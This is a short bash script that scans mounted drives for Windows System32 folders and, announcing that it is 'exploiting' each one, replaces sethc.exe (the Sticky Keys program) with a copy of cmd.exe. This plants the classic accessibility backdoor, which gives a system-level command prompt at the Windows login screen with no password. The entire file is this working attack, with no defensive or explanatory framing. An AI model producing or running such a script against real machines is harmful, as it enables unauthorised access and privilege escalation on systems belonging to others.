#!/usr/bin/env bash
for dir in /media/$USER/*; do
  lwindir="$dir/Windows/System32"
  if [ -d "$lwindir" ]; then
    # windirs+=($dir)
    echo "exploiting: $dir"
    (
      cd "$lwindir" || exit
      echo sethc.exe -> sethc.exe.old
      mv sethc.{exe,exe.old}
      echo cp cmd.exe -> sethc.exe
      cp {cmd,sethc}.exe
    )
  fi
done
# echo "${windirs[*]}"
